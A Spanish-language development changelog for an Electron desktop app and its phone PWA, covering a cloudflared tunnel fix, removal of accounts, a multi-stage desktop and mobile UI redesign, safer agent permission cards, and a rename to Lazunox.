- Pendiente: la prueba manual del dueño con datos móviles (la tabla por red sigue marcada «esperado, no verificado»); la PWA no muestra «Copiar enlace» ni «Guarda en favoritos» tras vincular (solo el aviso de la pantalla inicial); respaldo cifrado por el WebSocket (entrega 2).

## F8-B87: Modo viaje con el binario REAL: descarga, DNS de la autocomprobación y plazo de arranque

- Síntoma: al activar el Modo viaje en la app instalada la descarga de `cloudflared` fallaba al instante (quedaba `userData/bin` vacío). Las pruebas anteriores solo usaban simulacros; esta tanda recorre el camino real con Electron y red real (`scripts/travel-smoke.cjs`, manual, fuera de `npm test`/`verify`; documentado en su cabecera).
- Fallo 1, descarga: `net.fetch(url, { redirect: 'manual' })` de Electron lanza «Redirect was cancelled» ante la redirección de GitHub a `release-assets.githubusercontent.com`. Arreglo: `src/main/remote/tunnel/manual-fetch.ts` (`createManualFetch`, `net.request` con evento `redirect`; devuelve cada salto como 3xx y aborta, sin seguir nada solo) cableado en `remote/index.ts`; `CloudflaredBinary.download` sigue validando cada salto (lista cerrada, https, sin puerto/credenciales, prefijo solo en el primero) y no cambian el pin, el tamaño exacto ni los dos SHA-256 y la firma. Prueba: `manual-fetch.test.ts` (doble de `net.request` que se comporta como el de Electron; 302 → 200 instala, host ajeno o http/puerto/credenciales no se piden, hash distinto = `bad-hash`).
- Fallo 2, autocomprobación: el nombre del túnel todavía no existe en el DNS cuando `cloudflared` registra la conexión; la primera consulta recibía NXDOMAIN y los resolvedores lo guardan 60 s (SOA de la zona), así que los reintentos de 1–30 s en 45 s daban `getaddrinfo ENOTFOUND` y no salía el QR (reproducido 2 de 2). Arreglo: `signaling/tunnel-dns.ts` (`makeTunnelLookup`: pregunta a los NS autoritativos, no toca al sistema mientras el nombre no exista, respaldo al sistema solo si no hay forma de preguntar al autoritativo) usado por `realHttpGet`. Prueba: `tunnel-dns.test.ts`. Con el arreglo la autocomprobación real pasó en 2 s (incluida una 530 transitoria del borde).
- Fallo 3, plazo: con el binario real el arranque tardó de 8 s a más de 30 s en la misma red; `TRAVEL_PROCESS.startTimeoutMs` pasa de 30 a 60 s (`travel.test.ts` fija el margen). Fallo 4 (menor): `cloudflared` heredaba la carpeta de trabajo de la app y el vigía sin TCC protestaba con «getcwd» bajo ~/Documents; ahora corre en su `HOME` privado (`cloudflared.test.ts`, el falso imprime `FAKE_CWD`).
- Verificado de verdad (Electron 44 real, macOS arm64, `cloudflared` 2026.9.3 oficial, red doméstica en Chile, userData temporal): descarga 19 784 166 B en ~2 s, `tar`, SHA-256 del `.tgz` y del binario, `codesign` con el requisito Developer ID (equipo 68WVV388M8), ejecución sin diálogo de Gatekeeper, vigía `/bin/sh` + `withDisclaim` con `--no-autoupdate` y sin `--config`, URL `https://<4 palabras>.trycloudflare.com` en ~5 s, autocomprobación, `/k/<T>` → 303 + `__Host-onyxk; Secure; HttpOnly; SameSite=Lax`, 404 idéntico sin galleta o con `T` malo, PWA con galleta idéntica byte a byte y CSP con `wss://<host>`, `/cdn-cgi/` lo sirve Cloudflare, WebSocket rechazado sin galleta o con `Origin` ajeno y abierto con ambos, cierre en 1,6 s sin procesos huérfanos ni `pids.json`, URL muerta tras parar. NO verificado con el binario real: pings del Mac por el túnel y `hello`→`ready` (se agotaron los 4 túneles autorizados por un error del propio script, ya corregido), redes móviles y celular real.
- Se usaron los 4 túneles autorizados (2 fallaron por el DNS, 1 sin URL por el plazo, 1 completo); binario y userData temporales borrados; sin procesos sobrantes; sin push.

## F8-B88 — Se retiran las cuentas (decisión del dueño)

Se elimina el sistema de cuentas de F8-B19: `main/account/` (cliente, servicio, almacén `account.bin`, loopback, PKCE,
config), `ipc/account.ts`, los 9 canales `account:*` y el evento `account:changed` (contrato, esquemas y política del
remoto), `shared/account*.ts`, `ACCOUNT_API`/`PRIVACY_URL`/`TERMS_URL`, `AccountGate`/pantalla de acceso/Ajustes › Cuenta,
las áreas i18n `account`, `merr.acct.*` y `settings.account.*`, el servidor falso `e2e/fake-auth` y las variables
`ONYXCODE_ACCOUNT_URL`/`ONYXCODE_ACCOUNT_DISABLED`/`ONYXCODE_TEST_PLAIN_STORE`. Comportamiento = el de `ACCOUNT_API = null`.
Nuevo `cleanLegacyAccountSession` (en cada arranque, idempotente): borra solo `account.bin(.tmp)` y `account.test.json(.tmp)`
de userData; no usa `safeStorage` ni toca el Llavero (`remote.bin` sigue descifrándose). Guardia `src/test/no-accounts.test.ts`.
E2E: `sin-cuenta.e2e.ts` sustituye a `account.e2e.ts`. La cobertura del remoto sigue al 100 %. Volver a una versión
antigua con la cuenta encendida obliga a entrar de nuevo. El servidor, el VPS, el DNS `api.onyxcode.cl` y el cliente
OAuth quedan fuera del repo (los gestiona el dueño).

## F8-B89 — Rediseño de escritorio: fundamentos (parte 1, sin cambio en el celular)

Capa visual SOLO de escritorio: `main.tsx` marca `<html data-shell="desktop" data-platform>` e importa `app/desktop/index.css` (un CSS por
dueño: `tokens`, `base`, `shell`, `conversation`, `modes`); la PWA no la carga. Variante Tailwind `desk:` (`@custom-variant` en
`globals.css`). Tokens nuevos solo bajo `:root[data-shell='desktop']` (tipografía `--text-*`/`--font-ui|title|code`, `--space-*`,
`--radius-2xs…modal`, `--shadow-raised|pop|modal|focus`, `--scrim`, `--dur-instant|enter|exit`, `--z-*`, `--icon-stroke`); ningún token ni
color existente cambia. Las utilidades (`text-ui`, `rounded-ctl`, `shadow-pop`…) se registran con `@theme reference inline` (el plan A
`@theme reference` a secas copia el valor de `shadow-*` y pierde `line-height`; con `inline` usan `var(--token)` y no se emite ningún valor
en `:root` ni en la PWA).
Arreglos globales sin tocar marcado (`desktop/base.css`): velo de modales con `--scrim` (en oscuro `bg-fg/30` aclaraba el fondo), foco
con teclado que ya no cambia el radio del control (`revert-layer`), fuente del sistema sin Inter y sin `cv11/ss01`, trazo de iconos 1,75,
casillas con el acento, `.select-field` con `padding-right`, spinner 0,8 s, `.kbd`, pulgar de scroll, `user-select` del cromo y sin
escalado al presionar con movimiento reducido. NO incluidos aquí: componentes base (Spinner/Badge/Chip/Input/DialogFrame/Tooltip),
kit de UI y `desk:` en componentes (tandas 0.6–0.9 del plan).
Guardias: `desktop-scope.test.ts` (selectores con alcance, importaciones, variante, tabla de tokens), `stripDesk()` (`src/test/strip-desk.ts`)
aplicado a los 6 literales de `desktop-unchanged` y a los 3 snapshots de render SIN editar literales ni `.snap` ni usar `-u`, y
`selectors()` movido a `src/test/css-selectors.ts`. PWA: plugin `onyx-strip-desktop-css` (`stripDesktopCss`) quita del CSS compilado toda
regla con `data-shell`; `boot.css` 18,9 KB gzip antes y después (108 097 B idénticos), arranque 286,0 KB, `boot.js` 201,3 KB.
Herramientas: `scripts/shot-diff.mjs` (comparador de píxeles), `shot-desktop`: ratón fuera de la ventana y `--reduced-motion`.
Celular: 29 de 32 capturas idénticas; las 3 restantes (`lista-*`) difieren solo en el texto de hora relativa («hace 23 h» → «ayer»), no en CSS.

## F8-B93 — Rediseño de escritorio: Tareas, Rutinas, Ajustes, primer uso y Comparar (defectos de lógica L1–L6; sin cambio en el celular)

**Lógica.** L1/L2: «Activas» pasa a **«En otras carpetas»** (`activeElsewhere`) y la carpeta abierta tiene su grupo **«En curso»** con el estado del
renderer (`splitInProgress`), excluido de los grupos por fecha: una tarea nunca sale dos veces y la que espera aprobación aparece al instante
(`sidebar-groups.test.ts`). L3: la barra de aprobación solo se pinta si la tarjeta grande no se ve ≥60 % (`IntersectionObserver`; cierre seguro con
`shouldShowBar`: sin tarjeta u observador, se ve) y la tarjeta usa el mismo orden de botones que la barra (Rechazar con indicaciones a la izquierda;
Rechazar · Siempre · Permitir una vez a la derecha) (`approval-bar.test.ts`). L4: «1 modelo». L5: hora de 24 h en Rutinas en español
(`schedule.hours.test.ts`). L7: «Más rápido» exige ≥10 % y ≥200 ms de ventaja y las duraciones <10 s llevan una décima (`model.test.ts`). Cronómetro
«0:00» fuera: solo en vivo, la duración va en el `title` de la píldora («Duró 0:42»). L6: el copy del asistente decía «Se guarda en OpenCode, no en
{app}»; el código (`data-dir.ts`, `sandbox.ts`, `docs/SEGURIDAD.md`) confirma que la clave vive en el almacén propio de la app, así que se corrigió en es y en.
Foco inicial y de cada paso del asistente al título (sin anillo en «Obtener mi clave»).
**Interfaz (todo tras `desk:`, el celular no cambia).** Ajustes: `Row layout="stack-narrow"` (se apila con la tarjeta <34 rem; activado solo en Modelos,
«Dónde se puede usar» y Archivado), descripción 13/18, navegación agrupada Aplicación/Agentes/Conexiones/Ayuda (etiquetas en frase) y la nota de cifrado del
Celular en un recuadro con escudo, sin acortar el texto. Rutinas: lista de 760 px con grupos Activas/En pausa, modo y carpeta en cada fila e «Ideas para
empezar» bajo la lista. Comparar: métricas en chips con icono y rótulo, «sin dato» en lugar de «—», «Quedarme con este» secundario, columna descartada sin
`opacity-60`. Primer uso sin tarjetas anidadas. Fila de tarea de una línea con la hora a la derecha.
**Prueba.** Cambian dos expectativas de `CompareView.render.test.tsx` («sin dato» en lugar de «—», no son snapshots). No incluidos: `ActionCard`, filtros
compactos de la lista, reorden del buscador y editor de Rutinas (siguientes tandas).

## F8-B90 — Rediseño de escritorio: componentes base y kit de UI (fundamentos, parte 2; sin cambio en el celular)

Nuevos en `components/`: `Spinner` (mismo marcado que el `Loader2` escrito a mano), `Badge`, `Chip`, `Input`/`Select` (error accesible),
`EmptyState`, `DialogFrame` (velo `--scrim`, `aria-modal`, Esc y clic fuera), `Tooltip` (500 ms, 0 ms entre seguidos, `role="tooltip"`,
sin nodos extra; en la PWA devuelve el hijo) y `ui/recipes.ts` (`POP`, `CARD`, `ROW`, `MENU_ITEM`, `INPUT`, `SEGMENT`, `TAB`, `EMPTY`).
`Button` gana `xs`/`lg`, variantes `subtle`/`link` y `loading` (compatibles hacia atrás); `IconButton` gana `xs`/`lg`, `tooltip` y `shortcut`
(opt-in: con tooltip se quita el `title`, y varios E2E usan `getByTitle`; carga el tooltip perezosamente para no pesar en la PWA);
`Toggle` gana `size="sm"` y anillo de contraste apagado. Todo lo visual de escritorio va con `desk:`; el marcado previo queda fijado por
`base-markup.test.tsx` (con `stripDesk`, sin `-u`). Kit: `app/dev/UiKit.tsx` (solo con `#ui-kit` y `localStorage onyx.uikit=1`, desde `main.tsx`)
y `shot-desktop --scenario kit` (capturas por sección, estados forzados por CDP). Docs: `DESIGN.md`, `docs/UI-REDESIGN.md`.
Peso PWA: estos componentes suman ~0,5 KB gzip a `boot.js` (688,9 → ~690,2 KB min; gz 201,3 → 201,7): supera por ~0,2 KB el límite `min` 690 de boot.js (no se cambia el presupuesto; lo resuelve la integración sacando del bundle del celular el código solo de escritorio).

## F8-B91 — Estructura general de escritorio (barra lateral, cabeceras, paleta, selector de modelo, listas)

`App.tsx` publica `--header-inset` en `<main>` (112 px en Mac, 44 px en Windows, 0 con la barra visible) y las cabeceras/franjas suman
`pl-[calc(var(--header-inset,0px)+16px)]`: el botón flotante ya no pisa el título (D3). `PageHeader` gana `leading` y `variant`
(`page`/`workspace`) con un solo borde en escritorio. Franjas de aviso (`ServerBanner`, `EngineNotice`, `QuickEntryNotice` solo con `desk:`;
`UpdateNotice` libre): arrastrables, mínimo 36 px, botones de 28 px (D17). `Sidebar.tsx`: una sola guía a 22 px, filas de 32 px, búsqueda sin
borde, «Nuevo» sin caja y con el atajo siempre visible, trazo único 1.75, el modo actual conserva la marca suave con Ajustes abierto y
`aria-current` pasa a Ajustes (D5, D10, D15, D18); pie de 48 px. `CommandPalette`: velo `--scrim` vía `DialogScrim` (nuevos `components/Dialog.tsx`,
`layers.ts`, `surfaces.ts`), atajos como `<kbd>`, «Actual» como insignia, estado vacío con icono, «Esc cerrar» (clave `app.palette.close`) (D12).
`ModelPicker` (solo `desk:`): filas de 32 px, etiquetas en frase, insignias de 11 px (D13). Listas: Chat, Code (`SessionList` en una línea con barra
de acento y tiempo a la derecha, acciones de sección al pasar el ratón) y Tareas alineadas a la guía; etiquetas de grupo en FRASE en todas (decisión del dueño);
carpeta de Tareas como fila (D6, D7, D8). Icono del modo Tareas: `ListChecks` (D16). Pruebas: `Sidebar.render.test.tsx`, par `accent/bg-active` en `contrast.test.ts`.
Sin rediseñar `ConfirmDialog` (el velo ya lo arregla F1): los literales congelados no se tocaron. Pendiente/traspaso: las cabeceras de Chat/Code/Tareas/Comparar/Ajustes deben
sumar `--header-inset`; la fila buscador+filtros de Tareas es del agente de Tareas.

## F8-B92 — Rediseño de escritorio: conversación y Code (T1–T6, sin cambio en el celular)

Todo bajo `desk:` / `app/desktop/conversation.css` (`:root[data-shell='desktop']`); ninguna clase compartida se quitó ni se sustituyó, ninguna regla `.markdown` de `globals.css` se editó y no hay colores nuevos.

- **T1 defectos**: `UsageMeter` ya no parece un cargador (sin turnos del asistente no se pinta; anillo de 16 px con pista `--border`, arco solo con ≥1 %, extremos `butt`, y el `N %` al lado; el celular conserva su anillo); Enviar/Detener de Code `desk:shrink-0` (ya no se aplasta con el panel abierto) y con `aria-label`; adjuntar/mencionar con `aria-label`; cabecera de Code que encoge por prioridad (título > rama > proyecto, sin los 192 px fijos); degradado de 24 px sobre el compositor con `desk:before:` (CSS, cero coste por token).
- **T2 Markdown**: 15/24, encabezados en `--font-title`, código en línea sin borde, cita gris, casillas propias sin viñeta, cabecera de bloque de código sin franja, 13/20 en el código, tabla 14/20.
- **T3**: columna de 720 px (mensajes, compositores y avisos), ritmo de 24 px, burbuja del usuario plana de 16 px, acciones por mensaje de 28 px que flotan en el hueco (no abren vacío), un solo «pensando» (sin tres puntos; Code usa `ThinkingIndicator`) y un solo razonamiento (Code de escritorio usa el aspecto de Chat; contenido con `max-h-80`), «Build» ya no se pinta bajo cada mensaje (solo la insignia `Plan`), el historial de Chat ya no anima al abrirse.
- **T4**: Chat usa `ToolRow` (commit T4a) y agrupa herramientas con `StepGroup` (commit T4b, reversible por separado); fila de herramienta con chevron visible al enfocar con teclado (T4c).
- **T5**: compositor de Code con la caja del de Chat (radio 20 + halo), campo 15/24 hasta 288 px, pistas del Chat solo con foco, chips a 13 px, pie de Code que envuelve en vez de cortar Enviar.
- **T6**: tarjeta de permiso de Code sin halo (botones de 32 px, `kbd` a 0,8), pestañas del panel de 28 px, terminal 13 px con aire, árbol con filas de 26 px y foco interior visible, diff a 20 px y números de línea sin alfa.
- **Snapshots** (nunca `-u`; empalmes exactos con script en el scratchpad, verificados con `--word-diff`): `ChatMessageList` — fila del usuario sin `animate-rise-in` (3), 6 bloques de herramienta por su render de `ToolRow` (T4a), 3 envoltorios `StepGroup` (T4b); `MessageStream` — 4 bloques de razonamiento con el aspecto de Chat (T3). Dos pruebas con expectativas del diseño antiguo se actualizaron (`MessageStream.mobile`: sin puntos que rebotan; `ChatMessageList.mobile`: fila humanizada). Pruebas nuevas: `UsageMeter.render`, `ChatMessageList.group`.
- No hecho / pendiente: disparadores de `ModelPicker`/`EffortPicker` a 28 px (archivos con cambios de otro dueño), pistas de teclado de Code solo con foco, `DESIGN.md`, cabecera de hunk del diff a 11,5 px, `scripts/shot-mobile.mjs`. `size:pwa`: `boot.js min` 693,3 KB frente a 690 ya excedía antes de estas tandas (693,1 en 8e6abc1; esta área suma 0,2 KB); gzip 202,8/210.

## F8-B94 — Integración del rediseño de escritorio (peso de la PWA, pruebas y revisión visual)

- **Peso de la PWA** (sin tocar `pwa/budget.json`): `boot.js` pasa de 693,3 a 682,7 KB min (gz 202,8 → 200,1; límite 690/210). Dos pasos: (1) `pwa/vite.full.config.ts` gana el plugin `stripDesktopJsPlugin` (`src/renderer/remote/strip-desktop-js.ts`, con prueba) que quita las fichas `desk:` del JS minificado (el celular nunca marca `data-shell` y el CSS ya las perdía): -5,1 KB; (2) el popover de detalle del elemento (`ElementDetailPopover`) se baja bajo demanda en la PWA vía `SWAPS` + `remote/lazy/ElementDetailPopover.tsx`: -5,5 KB. Arranque total 285,2/300 KB gz y 750,1/780 KB min.
- **Guardia de alcance** (`app/desktop/desktop-scope.test.ts`): los literales `desk:` de PageHeader/CodeWorkspace/ui.tsx ya estaban corregidos por los dueños; los dos fallos que quedaban eran el ayudante nuevo de compilación (nombra `desk:`/`data-shell` para quitarlos), ahora exento como `strip-desktop-css`. La guardia no se debilita: sigue vigilando todo lo demás.
- **Verificación**: vitest completo 3723 pasan/19 omitidas (305 archivos), typecheck, lint (0 errores), format:check, build y build:pwa + size:pwa en verde; sin snapshots tocados.
- **Capturas**: escritorio 50 capturas (claro y oscuro) y celular 32 contra la base de F1: 24 idénticas; las 8 que difieren son textos de hora relativa («ayer»/«hace 23 h») y el icono de la pestaña Tareas (ahora `ListChecks`, decisión D16 del dueño; afecta también a la barra inferior del celular).
- **Defectos**: cabeceras de Code, Tareas, Comparar y Ajustes sin `--header-inset` (el botón de la barra colapsada pisaba el título): arreglado con `desk:pl-[calc(var(--header-inset,0px)+N px)]`. Sin arreglar (menores): selector «Agrupar: por fecha» de Tareas recortado en la barra lateral; `UsageMeter` muestra «0 %» junto a Detener en Tareas (datos falsos sin tokens; con turnos reales y contexto nulo se vería igual); la cabecera de Chat centrada sigue sin inset (solo roza con ventanas muy estrechas).

## F8-B95 — Cierre del rediseño de escritorio

- **Selector «Agrupar: por fecha»** (Tareas): en escritorio la etiqueta «Agrupar:» pasa a `desk:sr-only` (sigue siendo la etiqueta accesible) y el selector gana `desk:pl-2.5`; «por fecha» se lee entera junto a «Archivadas».
- **UsageMeter**: en escritorio no se pinta sin turnos, sin contexto o con un uso que redondea a 0 % (ya no hay aro vacío con «0 %» en Chat/Tareas); el celular no cambia. Prueba actualizada.
- **Icono de Tareas en el celular**: `MobileShell` vuelve a `Users` (escritorio sigue con `ListChecks`).
- **Verificación**: vitest renderer+test 1191 pasan, typecheck, lint (0 errores), format:check, build:pwa + size:pwa en verde (arranque 285,4 KB gz; budget.json intacto); captura tareas-lista revisada.

## F8-B96 — Piloto del rediseño de Claude Design (escritorio): barra lateral, inicio del chat, conversación y compositor

- **Barra lateral** (`app/Sidebar.tsx`, `ChatSessionList`, `desktop/shell.css`): 256 px sin borde (separada por tono `bg-sidebar`), filas de 32 px con 8 px de relleno y texto 14/20, fila activa con relleno de hover + peso 500 + icono de acento (sin la barrita de acento del historial), etiquetas de grupo en frase 11/16 de 28 px.
- **Inicio del chat vacío** (`ChatView`, `ChatComposer`): saludo 32/40 en la fuente de títulos, compositor flotante de 720 px (radio 20, alto mínimo 128, sin borde, `shadow-md`) y cuatro tarjetas de sugerencia en rejilla de 4 columnas (radio 12, `shadow-sm`, sin borde, icono en tile de 32 px + título + descripción nueva `chat.suggest.*.desc`; la quinta sugerencia «Traducir» sigue en el celular, no en la rejilla de escritorio). Sin logo ni halo.
- **Conversación y compositor inferior**: columna de lectura de 720 px reales (`measure-prose` + 48 de relleno), turnos a 32 px, bloques de la respuesta a 16 px (también en Markdown), burbuja del usuario con `bg-hover` radio 16 (78 %), compositor inferior radio 16 con `shadow-md`, nota 12/16 debajo.
- **Colores**: ninguno nuevo; `fill-selected`/`fill-hover` -> `bg-hover`, `fill-strong` -> `bg-active`, `surface` -> `bg-elevated`, `bg-app` -> `bg-bg`. Los hex del diseño difieren un poco de los de la app (p. ej. fondo `#121318` vs `#11131a`); se mantienen los de la app.
- **No hecho**: barra lateral colapsada de 56 px con iconos (hoy colapsar la oculta del todo, `inert`, y todas las cabeceras reservan `--header-inset`; requiere un riel nuevo y tocar `App.tsx`).
- **Verificación**: vitest renderer+test+shared 1602 pasan (snapshots sin cambios), typecheck, lint y prettier de los archivos tocados, build:pwa + size:pwa en verde (arranque 285,5 KB gz; budget.json intacto); capturas antes/después de chat-vacio y chat-conversacion en oscuro y claro.

## F8-B97 — Rediseño de escritorio: tarjetas de permiso de Tareas y Code (ND, solo escritorio)

Anatomía `oc-perm` en escritorio (título → consecuencia → comando literal → alcance/sandbox → acciones) con `role=alertdialog`,
comando envuelto sin recortar (aviso «El comando sigue: N líneas en total» por encima de 200 líneas/20 000 caracteres, y
caracteres ocultos avisados), descripción del modelo marcada «no verificada» y acciones en posiciones fijas. El celular/PWA no
cambia ni un píxel: los archivos compartidos bifurcan por `isRemoteSurface()` y las clases nuevas solo se AÑADEN con `desk:`.

- **Modelo de teclado seguro (solo escritorio)**: sin atajo global; `⌘↵` (Ctrl+↵ en Windows) permite solo con foco en la tarjeta,
  `document.hasFocus()`, tarjeta visible ≥60 %, armada 600 ms y sin `repeat`/IME/Alt/Shift; Enter NUNCA permite (sobre los botones
  Permitir hace `preventDefault()`); Esc rechaza; ningún botón Permitir recibe foco automático; el foco de la barra «Revisar» va al
  contenedor de la tarjeta. `usePermGuard` reutiliza `IntersectionObserver` (umbral 0,6) y un sondeo con refs para no re-render.
- **Retirado el 1/2/3 global de Code** (decisiones ND #4): «2» = permitir siempre desde el compositor era un riesgo existente. El
  prop `hotkeys` solo decide si se pinta el `<kbd>` de ⌘↵. Riesgo documentado en `docs/SEGURIDAD.md` §3 quadragies ter.
- **Barra compacta de aprobación**: en escritorio, para un comando destructivo, con salto de línea, >120 caracteres o caracteres
  ocultos, solo ofrece «Revisar» y «Rechazar» (nunca se aprueba a ciegas). El par Rechazar/Permitir una vez va con kbd `Esc`/`⌘↵`.
- **Red bloqueada (NetworkBlocked)**: se reordena en escritorio (decisiones ND #2) — «Mantener bloqueado» y «Permitir siempre» a la
  izquierda, «Permitir esta vez» a la derecha, armado 600 ms; el celular queda byte a byte igual (fijado con `cards.mobile-pin.test.tsx`).
- **Pruebas**: `lib/perm-guard.test.ts` (puro), `PermissionPrompt.desk.test.tsx`, `PermissionCard.desk.test.tsx`, `*mobile-pin.test.tsx`
  (fijación del celular ANTES de tocar), `e2e/specs/permisos-escritorio.e2e.ts` y escenarios `code-permiso` / `tareas-permiso-neutral` /
  `tareas-permiso-largo` en `scripts/shot-desktop.mjs`. `policy.ts` y `mac-confirm*` sin diff.

## F8-B98 — Rediseño de escritorio: Tareas, Rutinas y primer uso (sin cambio en el celular)

- **Lateral de Tareas**: filas de 32 px en una línea, estado a la derecha («Aprobar» en `warning`, «Trabajando» en acento, «Falló», hora), check `success` en terminadas, etiquetas de grupo del piloto, filtros como chips sin borde, «En otras carpetas» con la carpeta a la derecha. Claves nuevas `tasks.list.metaApprove` y `tasks.list.metaFailed` (es/en).
- **Cabecera y panel de Progreso**: píldora de 24 px, botones de icono de 32 px (icono de 16 por `desk:[&_svg]:size-4` en el botón), panel sin borde en `bg-sidebar`, pestañas como segmentado, secciones de 40 px con cuerpo a 30 px, Plan sin barra ni tachado, letras U/M/D en Cambios.
- **Conversación, inicio y primer uso**: columna, burbuja y compositor como el Chat; grupo de pasos sin caja con filete izquierdo; aviso de sandbox del compositor como aviso con contorno `warning` (único JSX nuevo: icono de escudo oculto en el celular); `Home` con plantillas sin borde y categorías como chips; tarjeta de primer uso con bloque «seguro» como aviso de acento; avisos de inactividad, interrupción y restauración con contorno de estado.
- **Rutinas**: Activas y En pausa como un grupo de superficie con filas de 64 px (envoltorio `contents` en el celular), ideas y plantillas sin borde, avisos con contorno, detalle sobre `bg-sidebar`, editor con velo `--scrim`, `shadow-modal`, campos de 32 px y segmentados con pista.
- **Asistente de primer uso** (`Wizard.tsx`, solo escritorio, clases base): velo `--scrim`, diálogo sin borde con `shadow-modal`, encabezado sin versalitas, título 22/28, tarjeta del proveedor recomendado seleccionable, avisos de seguridad con contorno.
- **Capturas**: escenarios nuevos `tareas-primer-uso`, `tareas-nueva`, `tareas-buscar`, `tareas-archivadas`, `rutinas-vacio`, `rutinas-detalle`, `rutinas-editor`, `onboarding-inicio`; el grupo de Tareas se ordena según `SCENARIOS`.
- **Celular**: solo clases `desk:` (más envoltorios `contents` y elementos `hidden desk:*`). Guardias nuevas con `stripDesk` y `toMatchInlineSnapshot` escritas sobre el código sin cambiar (`sidebar`, `progress`, `home`, `RoutinesView`, `RoutineEditor`); los envoltorios `contents` (pestañas de Progreso y grupos de Rutinas) quedan fuera de ellas. Colores: ninguno nuevo.

## F8-B99 — Integración del rediseño ND de escritorio (0.4.3)

Fusión de `nd/code`, `nd/permisos`, `nd/ajustes` y `nd/tareas` sobre fcd0604. Entradas B97 (permisos) y B98 (Tareas, Rutinas y primer uso) conservadas. El celular/PWA no cambia ni un píxel (32 capturas idénticas a la línea base de fcd0604).

- **Conflictos**: `CompareConfirmDialog.tsx` (se conserva la clase base del celular y se suman las `desk:` de ajustes), `scripts/shot-desktop.mjs` (unión de escenarios y orden de Tareas; `rutinas` usa `seedRoutines`) y este changelog (renumerado).
- **Guardia `PermissionCard.mobile-pin.test.tsx`** restaurada a su contenido original de b6a502a (literales idénticos; solo un `@ts-expect-error` por la opción sin `description`) y excluida de Prettier en `.prettierignore`.
- **Fixture de migración** `e2e/fixtures/legacy-userdata/.../000003.log` versionado con `git add -f` y negado en `.gitignore`, para que `m001-tasks-rename.test.ts` pase en clones limpios.
- **Verificación**: typecheck, vitest completo (3829 pasan, 0 fallos), lint (0 errores), format:check, build, build:pwa y size:pwa en verde; presupuestos intactos.

## F8-B100 — Arreglos finales de Code con el panel abierto (0.4.4)

Solo escritorio (clases `desk:` y rama `!isRemoteSurface()`); el celular/PWA no cambia. Colores sin cambios.

- **Ancho por defecto del panel** (`readWidth`): `min(45 % de la ventana, ventana - 256 - 480)` con mínimo de 300 y máximo de 880; el chat conserva ~480 px con la barra lateral visible. Se respeta siempre el valor guardado por el usuario.
- **Cabecera**: proyecto y rama con anchos mínimos mayores (7,5 y 6,5 rem) y `title` con el nombre completo; la barra es contenedor y por debajo de 32 rem oculta bifurcar/compactar y el título de la sesión.
- **Compositor**: la barra no desborda (`min-w-0`, grupo del modelo encogible); por debajo de 34 rem se oculta @, de 30 rem el esfuerzo, de 25 rem el texto del modo y Comparar; Enviar nunca se corta.
- **Pestañas del panel**: sin saltos de línea y con desplazamiento horizontal cuando el panel es estrecho.

## F8-B101 — Barra lateral 1b de escritorio (0.4.5)

Solo escritorio (clases `desk:`); el celular/PWA no cambia: 32 capturas idénticas a la línea base de fcd0604 (0 píxeles distintos).

- **Barra lateral**: título de 48 px, fila nueva con logo, buscador con ⌘K, modos 2×2 con punto de aprobaciones, encabezado Proyectos con proyectos plegables, hilos sangrados con hora, chip Aprobar, estado Trabajando y pie con conexión.
- **i18n del núcleo de la PWA**: `i18n-core-keys.json` regenerado (13 claves nuevas que pide el arranque) y formateado con Prettier.
- **Verificación**: typecheck, vitest completo (3833 pasan, 0 fallos), lint (0 errores), format:check, build, build:pwa y size:pwa en verde (arranque 287,7 KB gzip; presupuestos intactos).

## F8-B102 — Rediseño de la PWA del celular (integración T0–T5)

Solo celular/PWA; el escritorio no cambia (guardias de escritorio sin editar; sin `vitest -u`). Colores sin cambios (solo tokens existentes).

- **Armazón**: pestañas Chat · Code · Tareas · Rutinas (sin «Más»), cabecera centrada con menú, píldora y punto de aprobación (con `aria-label`), panel lateral
  perezoso con la lista del modo, buscador, «Nueva …», Ajustes y estado de conexión en el pie.
- **Inicio** (raíz de Chat): saludo, rejilla 2×2, compositor de 20/16 y aviso de aprobaciones que lleva a Tareas. **Conversación**: burbuja 16/16/4/16, chip de pasos de 36 px,
  código con anillo y radio 12.
- **Tareas**: raíz = aprobaciones arriba (destructivas primero) y «En curso». **Tarjeta de permiso** con el orden de decisiones-pwa #1 (destructivo: «Rechazar» arriba),
  botones de 44 px, sin `autoFocus`; el flujo de aprobación no cambia (ver `docs/SEGURIDAD.md`).
- **Ajustes**: una pantalla con la tarjeta de conexión («Tu Mac», Bloquear ahora, Desvincular) y filas de 52; `phone` unificada con `settings`.
- **Manifest**: `pwa/public/icon-maskable-512.png` (zona segura del 80 %, generado desde `build/icon.svg`) y su entrada `purpose: maskable`. Cambia el sitio firmado: lo publica y firma solo el dueño.
- **Peso (presupuestos intactos)**: `boot.js` 687,8 KB min (límite 690), arranque 287,9 KB gzip (límite 300), `boot.css` ~19,9 KB gzip (límite 20). Para caber: Inicio de Tareas por el
  índice de `features/tasks` (trozo perezoso), CSS de Markdown (`markdown.css`) e interruptores (`switch.css`) con sus trozos, y el giro «Trabajando» con `Loader2`.
- **Capturas**: `scripts/shot-mobile.mjs` con 10 escenarios (`inicio`, `panel`, `conversacion`, `chat-largo`, `tareas`, `permiso`, `ajustes`, `rutinas`, `bloqueo`, `vinculacion`);
  nueva línea base de 40 PNG (ver `docs/CAPTURAS-MOVIL.md`). `bloqueo-*` y `vinculacion-*`: 0 píxeles distintos frente a 0.4.5 (la capa ligera no se tocó).
- **Pendiente del dueño**: regenerar `src/renderer/remote/i18n-core-keys.json` (`UPDATE_PWA_I18N=1 npx vitest run src/renderer/remote/i18n-core.test.ts` y `npx prettier --write` del JSON);
  hasta entonces `i18n-core.test.ts` falla (única falla aceptada).

## F8-B103 — Renombre total a Lazunox (0.5.0)

Identidad única: `DISPLAY_NAME` === `INTERNAL_NAME` === «Lazunox», `APP_ID` `cl.bentec.lazunox`, helpers `cl.bentec.lazunox.*`, `Lazunox.app`, certificado «Lazunox Local Signing» (pin SHA-1 `8446c25f…`), `LAZUNOX_*` (sin compatibilidad), etiquetas `lazunox/remote/v3`, `lazunox-auth-v3` y `lazunox-sas-v3` con vectores regenerados (los celulares se vinculan de nuevo). Instalación nueva: userData, Llavero y permisos TCC desde cero.

- **Se conserva** (D7, D12): migraciones heredadas Lapis/OpenDesk/Tareas (`legacy-names.ts`), dominio `remoto.onyxcode.cl` concentrado en `CLOUD_DOMAIN`, `ALLOWED_ORIGINS` y `SITE_ORIGIN` (EXTERNO-PENDIENTE D3), túneles y Access de Cloudflare, `LICENSE` y su titular (D10), `scripts/win/**` (el PC de pruebas real sigue en `C:\onyx`, host `win-onyx`).
